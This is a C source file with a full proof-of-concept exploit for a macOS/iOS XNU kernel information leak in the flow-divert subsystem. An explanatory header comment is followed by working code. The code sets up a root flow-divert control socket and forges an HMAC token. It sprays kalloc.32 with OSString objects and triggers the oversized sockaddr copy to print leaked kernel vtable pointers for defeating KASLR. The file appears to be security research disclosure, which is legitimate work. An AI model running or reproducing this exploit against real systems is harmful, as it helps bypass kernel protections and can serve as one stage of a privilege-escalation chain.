/*
 * flow_divert-leak.c
 * Brandon Azad
 *
 * While looking through bsd/netinet/flow_divert.c in XNU, I noticed that the function
 * flow_divert_create_connect_packet() would copy sizeof(struct sockaddr_storage) = 128 bytes from
 * the fd_cb->local_address sockaddr struct, even if fd_cb->local_address is a sockaddr that is
 * smaller than 128 bytes. This is a root->kernel-infoleak vulnerability.
 *
 * The function flow_divert_create_connect_packet() is called by flow_divert_connect_out(), which
 * will write the generated connect packet to the kernel control socket using
 * flow_divert_send_packet(). The function flow_divert_connect_out() is the pru_connect function in
 * the g_flow_divert_in_usrreqs structure, so it will be called whenever connect() is called on a
 * socket managed by the flow-divert system.
 *
 * Actually triggering this vulnerability from user space requires a nontrivial amount of setup. We
 * first set up a control socket for a new flow-divert group. This step requires root privileges.
 * The control socket gives us the ability to manage a set of client sockets using the flow-divert
 * system. Once we've initialized the flow-divert group, we create a socket on the loopback
 * interface and add it to the flow-divert group by generating a flow-divert token for it. At this
 * point, any call to connect() will trigger the kernel to send a flow-divert packet of type
 * FLOW_DIVERT_PKT_CONNECT on the flow-divert control socket. However, the vulnerability in
 * flow_divert_create_connect_packet will not be triggered unless the client socket already has an
 * address and port. This means we will first call bind() on the client socket to give it a local
 * address, then we will call connect() to cause the kernel to send the CONNECT packet with the
 * information leak. However, the kernel will block in connect(), since the point of the
 * flow-divert system is to let the process with the control socket intercede in connections
 * created by clients. In order to return from connect(), we must send a reply packet of type
 * FLOW_DIVERT_PKT_CONNECT_RESULT back on the control socket. This must be done in a separate
 * thread, since the first thread is blocked in connect(). Once the second thread reads the CONNECT
 * packet and sends a CONNECT_RESULT in reply, connect() will return in the main thread and we can
 * process the infoleak.
 *
 * In order to make it easy to leak useful (read: kernel text) pointers, we use an IPv6 socket for
 * the client so that the allocated sockaddr struct lies within kalloc.32, the same zone in which
 * OSString and OSSymbol objects are allocated. The IPv4 sockaddr struct is just 16 bytes, and it's
 * somewhat more difficult to heap spray useful kernel pointers in kalloc.16. It's really quite
 * nice that this bug gives us a choice of zones to leak from. :)
 *
 * We also start up a worker thread to repeatedly fill kalloc.32 with OSString instances,
 * increasing the likelihood of leaking a vtable pointer. The easiest way to spray the kernel heap
 * with OSString instances is using the kernel function OSUnserializeXML, which can be reached from
 * user space by calling IOServiceGetMatchingServices. Each string in the matching dictionary
 * passed to this function will cause OSUnserializeXML to create a new OSString instance. By
 * supplying a matching dictionary with a large number of strings, we can flood kalloc.32 with
 * OSString instances, which makes it more likely that the information leak will read a vtable
 * pointer and recover the kernel slide.
 *
 * Exploitation requires root privileges and the ability to bind and connect sockets on a network
 * interface.
 */

#include <errno.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include <CommonCrypto/CommonCrypto.h>
#include <CoreFoundation/CoreFoundation.h>

#if __x86_64__

// ---- Header files not available on iOS ---------------------------------------------------------

#include <sys/sys_domain.h>
#include <sys/kern_control.h>

#include <IOKit/IOKitLib.h>

#else /* __x86_64__ */

// If we're not on x86_64, then we probably don't have access to the above headers. The following
// definitions are copied directly from the macOS header files.

// ---- Definitions from sys/sys_domain.h ---------------------------------------------------------

#define SYSPROTO_CONTROL	2	/* kernel control protocol */

#define AF_SYS_CONTROL		2	/* corresponding sub address type */

// ---- Definitions from sys/kern_control.h -------------------------------------------------------

#define CTLIOCGINFO     _IOWR('N', 3, struct ctl_info)	/* get id from name */

#define MAX_KCTL_NAME	96

struct ctl_info {
    u_int32_t	ctl_id;					/* Kernel Controller ID  */
    char	ctl_name[MAX_KCTL_NAME];		/* Kernel Controller Name (a C string) */
};

struct sockaddr_ctl {
    u_char	sc_len;		/* depends on size of bundle ID string */
    u_char	sc_family;	/* AF_SYSTEM */
    u_int16_t 	ss_sysaddr;	/* AF_SYS_KERNCONTROL */
    u_int32_t	sc_id; 		/* Controller unique identifier  */
    u_int32_t 	sc_unit;	/* Developer private unit number */
    u_int32_t 	sc_reserved[5];
};

// ---- Definitions from IOKit.framework ----------------------------------------------------------

typedef mach_port_t	io_object_t;
typedef io_object_t	io_iterator_t;

#define	IO_OBJECT_NULL	((io_object_t) 0)

extern
const mach_port_t kIOMasterPortDefault;

kern_return_t
IOObjectRelease(
	io_object_t	object );

kern_return_t
IOServiceGetMatchingServices(
	mach_port_t	masterPort,
	CFDictionaryRef	matching CF_RELEASES_ARGUMENT,
	io_iterator_t * existing );

#endif /* __x86_64__ */

// The following definitions are not available in the header files for any platform. They are
// copied directly from the corresponding header files in XNU.

// ---- Definitions from bsd/sys/socket.h ---------------------------------------------------------

#define	SO_FLOW_DIVERT_TOKEN	0x1106	/* flow divert token */

// ---- Definitions from bsd/netinet/flow_divert_proto.h ------------------------------------------

#define FLOW_DIVERT_CONTROL_NAME		"com.apple.flow-divert"

#define FLOW_DIVERT_PKT_CONNECT			1
#define FLOW_DIVERT_PKT_CONNECT_RESULT		2
#define FLOW_DIVERT_PKT_CLOSE			4
#define FLOW_DIVERT_PKT_GROUP_INIT		6
#define FLOW_DIVERT_PKT_APP_MAP_CREATE		9

#define FLOW_DIVERT_TLV_ERROR_CODE		5
#define FLOW_DIVERT_TLV_SPACE_AVAILABLE		9
#define FLOW_DIVERT_TLV_CTL_UNIT		10
#define FLOW_DIVERT_TLV_LOCAL_ADDR		11
#define FLOW_DIVERT_TLV_REMOTE_ADDR		12
#define FLOW_DIVERT_TLV_OUT_IF_INDEX		13
#define FLOW_DIVERT_TLV_TOKEN_KEY		17
#define FLOW_DIVERT_TLV_HMAC			18
#define FLOW_DIVERT_TLV_SIGNING_ID		25
#define FLOW_DIVERT_TLV_PREFIX_COUNT		28

struct flow_divert_packet_header {
    uint8_t		packet_type;
    uint32_t		conn_id;
};

// ---- Macros ------------------------------------------------------------------------------------

#define DEBUG 0

#if DEBUG
#define DEBUG_TRACE(fmt, ...)	printf(fmt"\n", ##__VA_ARGS__)
#else
#define DEBUG_TRACE(fmt, ...)
#endif

#define ERROR(fmt, ...)		printf("Error: "fmt"\n", ##__VA_ARGS__)

#define WARNING(fmt, ...)	printf("Warning: "fmt"\n", ##__VA_ARGS__)

// ---- Constants and global variables ------------------------------------------------------------

// The flow-divert token key and key size.
#define TOKEN_KEY	"ab123456"
#define TOKEN_KEY_SIZE	8

// The flow-divert signing ID and signing ID size.
#define SIGNING_ID	"ab789012"
#define SIGNING_ID_SIZE	8

// The number of elements in the kernel heap spray. Interestingly, in my (very non-methodical)
// testing, a smaller heap spray size (say, 0x100) is more effective than a larger heap spray size
// (say, 0x1000).
static const size_t kernel_heap_spray_size = 0x100;

// The control unit number. We need to know the control unit for the token that's used to register
// a socket with the flow-divert system. It's easier to use a hard-coded control unit number.
static const int ctl_unit = 2;

// This infoleak targets the kalloc.32 zone.
static const size_t zone_size = 32;

// The interface index on which we will connect and bind sockets..
static unsigned int interface_index;

// The control socket for flow-divert.
static int ctlfd = -1;

// The socket managed by flow-divert.
static int sockfd = -1;

// The address to which the socket will both bind and connect. This structure is global because it
// is needed by both the client thread (the main thread) and the control socket receiver. For
// whatever reason, when the client registers a socket with the flow-divert system using a token,
// the CONNECT packet that gets sent to the control socket does not contain the destination address
// to which the socket is connecting.
static struct sockaddr_in6 saddr_in6 = {
	.sin6_len      = sizeof(saddr_in6),
	.sin6_family   = AF_INET6,
	.sin6_port     = htons(8802),
	.sin6_addr     = IN6ADDR_LOOPBACK_INIT,
};

// The thread that is spraying kalloc.32 with OSString instances.
static pthread_t kernel_heap_spray_thread;

// Whether kernel_heap_spray_thread should be running.
static volatile bool kernel_heap_spray_thread_running = true;

// Whether the kernel_heap_spray_thread has finished setup.
static bool kernel_heap_spray_thread_set_up = false;

// The thread that is receiving messages on ctlfd.
static pthread_t flow_divert_control_receive_thread;

// Whether flow_divert_control_receive_thread should be running.
static volatile bool flow_divert_control_receive_thread_running = true;

// The error code on the flow_divert_control_receive_thread.
static int flow_divert_control_receive_thread_error = 0;

// Whether flow_divert_control_receive_thread has received the CLOSE packet indicating that the
// client has closed the connection.
static bool flow_divert_client_closed = false;

// Whether the information leak was successful.
static bool infoleak_success = false;

// ---- kernel_heap_spray_thread ------------------------------------------------------------------

// Create a heap spray CFDictionary that can be passed to IOServiceGetMatchingServices. This
// dictionary is filled with many unique keys and values, causing many objects of type OSString and
// OSSymbol to be created in the kernel.
static CFDictionaryRef create_heap_spray_CFDictionary() {
	CFStringRef *keys = malloc(kernel_heap_spray_size * sizeof(*keys));
	CFStringRef *values = malloc(kernel_heap_spray_size * sizeof(*keys));
	for (size_t i = 0; i < kernel_heap_spray_size; i++) {
		char str[16];
		snprintf(str + 1, sizeof(str) - 1, "%zx", i);
		str[0] = 'k';
		keys[i] = CFStringCreateWithCString(kCFAllocatorDefault, str,
				kCFStringEncodingUTF8);
		str[0] = 'v';
		values[i] = CFStringCreateWithCString(kCFAllocatorDefault, str,
				kCFStringEncodingUTF8);
	}
	CFDictionaryRef dict = CFDictionaryCreate(kCFAllocatorDefault,
			(const void **)keys, (const void **)values, kernel_heap_spray_size,
			&kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
	free(keys);
	free(values);
	return dict;
}

// The thread that will be continuously spraying the kernel heap with OSString instances to
// increase the likelihood of a successful kernel infoleak.
static void *kernel_heap_spray_thread_func(void *arg) {
	DEBUG_TRACE("Starting kernel heap spray thread");
	CFDictionaryRef dict = create_heap_spray_CFDictionary();
	while (kernel_heap_spray_thread_running) {
		CFRetain(dict);
		io_iterator_t iter = IO_OBJECT_NULL;
		IOServiceGetMatchingServices(kIOMasterPortDefault, dict, &iter);
		if (iter != IO_OBJECT_NULL) {
			IOObjectRelease(iter);
		}
		if (!kernel_heap_spray_thread_set_up) {
			DEBUG_TRACE("First kernel heap spray complete");
			kernel_heap_spray_thread_set_up = true;
		}
	}
	CFRelease(dict);
	DEBUG_TRACE("Exiting kernel heap spray thread");
	return NULL;
}

// ---- flow_divert_control_receive_thread --------------------------------------------------------

#if DEBUG

// Dump data to stdout.
static void dump(const void *data, size_t size) {
	const uint8_t *p = data;
	const uint8_t *end = p + size;
	unsigned off = 0;
	while (p < end) {
		printf("%04x:  %02x", off & 0xffff, *p++);
		for (unsigned i = 1; i < 16 && p < end; i++) {
			bool space = (i % 8) == 0;
			printf(" %s%02x", (space ? " " : ""), *p++);
		}
		printf("\n");
		off += 16;
	}
}

#endif

// Find a TLV tuple in a flow-divert packet.
static bool find_flow_divert_tlv(const void *data, size_t size, uint8_t type,
		size_t *length, const void **value) {
	const uint8_t *p = data;
	const size_t type_length_size = sizeof(uint8_t) + sizeof(uint32_t);
	for (;;) {
		if (size < type_length_size) {
			return false;
		}
		uint8_t  this_type   = *p;
		uint32_t this_length = ntohl(*(uint32_t *)(p + 1));
		p    += type_length_size;
		size -= type_length_size;
		if (this_length > size) {
			return false;
		}
		if (this_type == type) {
			*length = this_length;
			*value  = p;
			return true;
		}
		p    += this_length;
		size -= this_length;
	}
}

// Send a CONNECT_RESULT packet back on the flow-divert control socket, allowing the client's
// connect request to succeed. Used by the flow_divert_control_receive_thread after having received
// a CONNECT packet.
static int send_flow_divert_connect_result_packet(uint32_t conn_id) {
	struct __attribute__((packed)) {
		uint8_t             packet_type;
		uint8_t             pad1[3];
		uint32_t            conn_id;
		uint8_t             connect_error_type;
		uint32_t            connect_error_length;
		uint32_t            connect_error_value;
		uint8_t             send_window_type;
		uint32_t            send_window_length;
		uint32_t            send_window_value;
		uint8_t             remote_address_type;
		uint32_t            remote_address_length;
		struct sockaddr_in6 remote_address_value;
		uint8_t             out_if_index_type;
		uint32_t            out_if_index_length;
		int                 out_if_index_value;
	} connect_result = {
		.packet_type           = FLOW_DIVERT_PKT_CONNECT_RESULT,
		.conn_id               = conn_id,
		.connect_error_type    = FLOW_DIVERT_TLV_ERROR_CODE,
		.connect_error_length  = htonl(sizeof(connect_result.connect_error_value)),
		.connect_error_value   = 0,
		.send_window_type      = FLOW_DIVERT_TLV_SPACE_AVAILABLE,
		.send_window_length    = htonl(sizeof(connect_result.send_window_value)),
		.send_window_value     = htonl(0x1000), // Incidentally, this parameter is also an
		                                        // infoleak vector.
		.remote_address_type   = FLOW_DIVERT_TLV_REMOTE_ADDR,
		.remote_address_length = htonl(sizeof(connect_result.remote_address_value)),
		.remote_address_value  = saddr_in6,
		.out_if_index_type     = FLOW_DIVERT_TLV_OUT_IF_INDEX,
		.out_if_index_length   = htonl(sizeof(connect_result.out_if_index_value)),
		.out_if_index_value    = interface_index,
	};
	ssize_t written = write(ctlfd, &connect_result, sizeof(connect_result));
	if (written != sizeof(connect_result)) {
		ERROR("Could not send the %s packet to the flow-divert control socket: errno %d",
				"CONNECT_RESULT", errno);
		return 1;
	}
	return 0;
}

// Process the information leaked from the kernel. This is 128 bytes of heap memory read from the
// kalloc.32 zone, for a total of 96 leaked bytes. We'd like for the leaked bytes to contain an
// OSString or OSSymbol, since instances of these classes also lie in the kalloc.32 zone. The first
// word of a zone element will be the vtable pointer, which can be used to determine the kernel
// slide. Each leak gives 3 opportunities to figure out the kernel slide.
static int process_kernel_infoleak(const void *data, size_t data_size) {
	if (data_size <= zone_size) {
		ERROR("No leaked kernel data. The vulnerability may have been patched.");
		return 2;
	}
#if DEBUG
	dump(data, data_size);
#endif
	for (size_t offset = zone_size; offset + sizeof(uint64_t) <= data_size;
			offset += zone_size) {
		uint64_t leak = *(const uint64_t *)((const uint8_t *)data + offset);
		printf("0x%016llx\n", leak);
	}
	infoleak_success = true;
	return 0;
}

// Handle a CONNECT packet coming from the flow-divert system over the control socket. This packet
// informs us that a client has called connect(), and gives us the opportunity to intercede. This
// is also the packet that contains the information leak.
static int handle_flow_divert_connect_packet(const struct flow_divert_packet_header *hdr,
		const void *packet, size_t packet_size) {
	int ret = 0;
	const void *data;
	size_t data_size;
	bool have_laddr = find_flow_divert_tlv(packet, packet_size,
			FLOW_DIVERT_TLV_LOCAL_ADDR, &data_size, &data);
	if (!have_laddr) {
		ERROR("The CONNECT packet didn't contain a FLOW_DIVERT_TLV_LOCAL_ADDR tuple");
		ret = 3;
	}
	ret = send_flow_divert_connect_result_packet(hdr->conn_id)
		|| ret
		|| process_kernel_infoleak(data, data_size);
	return ret;
}

// A thread that continuously receives and processes messages from the flow-divert control socket.
static void *flow_divert_control_receive_thread_func(void *arg) {
	DEBUG_TRACE("Starting receive thread for flow-divert control socket");
	while (flow_divert_control_receive_thread_running) {
		// Read the packet from the flow-divert control socket.
		uint8_t buffer[0x1000];
		ssize_t recv_count = recv(ctlfd, buffer, sizeof(buffer), 0);
		if (recv_count < 0) {
			flow_divert_control_receive_thread_running = false;
		}
		struct flow_divert_packet_header *hdr = (void *)buffer;
		if (recv_count <= (ssize_t)sizeof(*hdr)) {
			continue;
		}
		// Process the packet.
		void *packet = hdr + 1;
		size_t packet_size = recv_count - sizeof(*hdr);
		if (hdr->packet_type == FLOW_DIVERT_PKT_CONNECT) {
			DEBUG_TRACE("Received CONNECT packet");
			flow_divert_control_receive_thread_error =
				handle_flow_divert_connect_packet(hdr, packet, packet_size);
		} else if (hdr->packet_type == FLOW_DIVERT_PKT_CONNECT_RESULT) {
			DEBUG_TRACE("Received CONNECT_RESULT packet");
		} else if (hdr->packet_type == FLOW_DIVERT_PKT_CLOSE) {
			DEBUG_TRACE("Received CLOSE packet");
			flow_divert_client_closed = true;
		} else {
			WARNING("Received unrecognized packet, packet_type=%u, packet_size=%zu",
					hdr->packet_type, packet_size);
		}
	}
	DEBUG_TRACE("Exiting receive thread for flow-divert control socket");
	return NULL;
}

// ---- Functions ---------------------------------------------------------------------------------

// Open the control socket for com.apple.flow-divert. Requires root privileges.
static int open_flow_divert_control_socket() {
	ctlfd = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL);
	if (ctlfd < 0) {
		ERROR("Could not create a system control socket: errno %d", errno);
		return 4;
	}
	struct ctl_info ctlinfo = { .ctl_id = 0 };
	strncpy(ctlinfo.ctl_name, FLOW_DIVERT_CONTROL_NAME, sizeof(ctlinfo.ctl_name));
	int err = ioctl(ctlfd, CTLIOCGINFO, &ctlinfo);
	if (err) {
		ERROR("Could not retrieve the control ID number for %s: errno %d",
				FLOW_DIVERT_CONTROL_NAME, errno);
		return 5;
	}
	struct sockaddr_ctl addr = {
		.sc_len     = sizeof(addr),
		.sc_family  = AF_SYSTEM,
		.ss_sysaddr = AF_SYS_CONTROL,
		.sc_id      = ctlinfo.ctl_id, // com.apple.flow-divert
		.sc_unit    = ctl_unit,       // The control group unit number.
	};
	err = connect(ctlfd, (struct sockaddr *)&addr, sizeof(addr));
	if (err) {
		ERROR("Could not connect to the flow-divert control system (ID %d) "
				"unit %d: errno %d", addr.sc_id, addr.sc_unit, errno);
		return 6;
	}
	return 0;
}

// Initialize the flow-divert control group.
static int initialize_flow_divert_control_group() {
	// Initialize the control group's token key.
	struct __attribute__((packed)) {
		uint8_t  packet_type;
		uint8_t  pad1[3];
		uint32_t conn_id;
		uint8_t  token_key_type;
		uint32_t token_key_length;
		uint8_t  token_key_value[TOKEN_KEY_SIZE];
	} group_init = {
		.packet_type      = FLOW_DIVERT_PKT_GROUP_INIT,
		.conn_id          = 0,                          // No connection.
		.token_key_type   = FLOW_DIVERT_TLV_TOKEN_KEY,
		.token_key_length = htonl(sizeof(group_init.token_key_value)),
		.token_key_value  = TOKEN_KEY,
	};
	ssize_t written = write(ctlfd, &group_init, sizeof(group_init));
	if (written != sizeof(group_init)) {
		ERROR("Could not send the %s packet to the flow-divert control socket: errno %d",
				"GROUP_INIT", errno);
		return 7;
	}
	// Set up the control group's signing ID map.
	struct __attribute__((packed)) {
		uint8_t  packet_type;
		uint8_t  pad1[3];
		uint32_t conn_id;
		uint8_t  prefix_count_type;
		uint32_t prefix_count_length;
		int      prefix_count_value;
		uint8_t  signing_id_type;
		uint32_t signing_id_length;
		char     signing_id_value[SIGNING_ID_SIZE];
	} app_map_create = {
		.packet_type         = FLOW_DIVERT_PKT_APP_MAP_CREATE,
		.conn_id             = 0,
		.prefix_count_type   = FLOW_DIVERT_TLV_PREFIX_COUNT,
		.prefix_count_length = htonl(sizeof(app_map_create.prefix_count_value)),
		.prefix_count_value  = 1,
		.signing_id_type     = FLOW_DIVERT_TLV_SIGNING_ID,
		.signing_id_length   = htonl(sizeof(app_map_create.signing_id_value)),
		.signing_id_value    = SIGNING_ID,

	};
	written = write(ctlfd, &app_map_create, sizeof(app_map_create));
	if (written != sizeof(app_map_create)) {
		ERROR("Could not send the %s packet to the flow-divert control socket: errno %d",
				"APP_MAP_CREATE", errno);
		return 8;
	}
	return 0;
}

// Create a thread to spray the kernel heap with useful pointers to leak.
static int create_kernel_heap_spray_thread() {
	int err = pthread_create(&kernel_heap_spray_thread, NULL,
			kernel_heap_spray_thread_func, NULL);
	if (err) {
		ERROR("Could not spawn %s: errno %d", "kernel_heap_spray_thread", err);
		return 9;
	}
	return 0;
}

// Create a thread to receive and process messages from the flow-divert control socket.
static int create_flow_divert_control_receive_thread() {
	int err = pthread_create(&flow_divert_control_receive_thread, NULL,
			flow_divert_control_receive_thread_func, NULL);
	if (err) {
		ERROR("Could not spawn %s: errno %d", "flow_divert_control_receive_thread", err);
		return 10;
	}
	return 0;
}

// Create a client socket and register it with the flow-divert system.
int create_flow_divert_client_socket() {
	sockfd = socket(AF_INET6, SOCK_DGRAM, 0);
	if (sockfd < 0) {
		ERROR("Could not create AF_INET6 socket: errno %d", errno);
		return 11;
	}
	struct __attribute__((packed)) token {
		uint8_t  ctl_unit_type;
		uint32_t ctl_unit_length;
		uint32_t ctl_unit_value;
		uint8_t  signing_id_type;
		uint32_t signing_id_length;
		char     signing_id_value[SIGNING_ID_SIZE];
		uint8_t  hmac_type;
		uint32_t hmac_length;
		uint8_t  hmac_value[20];
	} token = {
		.ctl_unit_type     = FLOW_DIVERT_TLV_CTL_UNIT,
		.ctl_unit_length   = htonl(sizeof(token.ctl_unit_value)),
		.ctl_unit_value    = htonl(ctl_unit),
		.signing_id_type   = FLOW_DIVERT_TLV_SIGNING_ID,
		.signing_id_length = htonl(sizeof(token.signing_id_value)),
		.signing_id_value  = SIGNING_ID,
		.hmac_type         = FLOW_DIVERT_TLV_HMAC,
		.hmac_length       = htonl(sizeof(token.hmac_value)),
	};
	CCHmac(kCCHmacAlgSHA1, TOKEN_KEY, TOKEN_KEY_SIZE, &token,
			offsetof(struct token, hmac_type), token.hmac_value);
	int err = setsockopt(sockfd, SOL_SOCKET, SO_FLOW_DIVERT_TOKEN, &token, sizeof(token));
	if (err) {
		ERROR("Could not set flow-divert token on socket: errno %d", errno);
		return 12;
	}
	return 0;
}

// Bind the client socket managed by flow-divert to a localhost address and connect. The call to
// connect will cause the kernel to send a CONNECT packet on the control socket. This function also
// sets the interface_index variable.
static int connect_flow_divert_client_socket() {
	interface_index = if_nametoindex("lo0");
	if (interface_index == 0) {
		ERROR("Could not retrieve interface index for interface %s: errno %d",
				"lo0", errno);
		return 13;
	}
	saddr_in6.sin6_scope_id = interface_index;
	// We need to bind the socket to an address before calling connect in order to trigger the
	// information leak.
	int err = bind(sockfd, (struct sockaddr *)&saddr_in6, sizeof(saddr_in6));
	if (err) {
		ERROR("Could not bind flow-divert client socket: errno %d", errno);
		return 14;
	}
	// Execute flow_divert_connect_out, generating a CONNECT packet that will contain the
	// leaked kernel heap data. This syscall won't return until after we send the
	// CONNECT_RESULT packet back to the kernel on the flow_divert_control_receive_thread.
	err = connect(sockfd, (struct sockaddr *)&saddr_in6, sizeof(saddr_in6));
	if (err) {
		ERROR("Could not connect flow-divert client socket: errno %d", errno);
		return 15;
	}
	return 0;
}

// Clean up the client state after a leak attempt. This includes closing the client socket and
// waiting for any processing to happen on the flow_divert_control_receive_thread.
static int clean_up_flow_divert_client_state() {
	// If we've gotten to this point, then either we aborted early or connect() has returned.
	// Close the client socket. This will trigger a close packet to be sent if we've
	// successfully connected.
	if (sockfd >= 0) {
		close(sockfd);
		sockfd = -1;
	}
	// Wait for processing to finish on flow_divert_control_receive_thread. The processing
	// should finish in one of two ways: We either encounter an error
	// (flow_divert_control_receive_thread_error is nonzero), or we get a close packet from the
	// above close().
	for (size_t i = 0; i <= 200; i++) {
		usleep(100 * i);
		int ret = flow_divert_control_receive_thread_error;
		if (ret != 0) {
			flow_divert_control_receive_thread_error = 0;
			return ret;
		}
		if (flow_divert_client_closed) {
			flow_divert_client_closed = false;
			return 0;
		}
	}
	// If we're at this point, then we have neither encountered an error nor received a close
	// packet, despite waiting for about two seconds. Give up and assume that the system isn't
	// working the way we expect it to.
	ERROR("Timeout while waiting for flow-divert to respond");
	return 16;
}

// Set up all state for the flow-divert control system. This includes creating the flow-divert
// control socket, initializing the flow-divert control group, and creating the
// flow_divert_control_receive_thread.
static int set_up_flow_divert_control_state() {
	int ret = open_flow_divert_control_socket()
		|| initialize_flow_divert_control_group()
		|| create_kernel_heap_spray_thread()
		|| create_flow_divert_control_receive_thread();
	if (ret == 0) {
		// Wait for the first heap spray to take place.
		while (!kernel_heap_spray_thread_set_up) {
			usleep(1000);
		}
	}
	return ret;
}

// Clean up all state for the flow-divert system established in set_up_flow_divert_control_state().
static void clean_up_flow_divert_control_state() {
	kernel_heap_spray_thread_running = false;
	pthread_join(kernel_heap_spray_thread, NULL);
	if (ctlfd >= 0) {
		close(ctlfd);
		ctlfd = -1;
	}
	flow_divert_control_receive_thread_running = false;
	pthread_join(flow_divert_control_receive_thread, NULL);
}

// Try to trigger the infoleak by creating a flow-divert client socket and calling connect() on
// that socket. The flow_divert_control_receive_thread established earlier should receive the
// CONNECT packet from the kernel with the infoleak.
static int try_flow_divert_client_leak() {
	int ret = create_flow_divert_client_socket()
		|| connect_flow_divert_client_socket();
	int ret2 = clean_up_flow_divert_client_state();
	return ret || ret2;
}

// Run the infoleak exploit.
static int flow_divert_infoleak() {
	int ret = set_up_flow_divert_control_state();
	if (ret == 0) {
		for (size_t try = 1;; try++) {
			ret = try_flow_divert_client_leak();
			if (ret != 0 || infoleak_success) {
				break;
			}
			if (ret == 0 && try >= 1000) {
				ERROR("Could not trigger infoleak after %zu attempts", try);
				ret = 17;
				break;
			}
			usleep(50 * 1000);
		}
	}
	clean_up_flow_divert_control_state();
	return ret;
}

// ---- Main --------------------------------------------------------------------------------------

int main() {
	return flow_divert_infoleak();
}
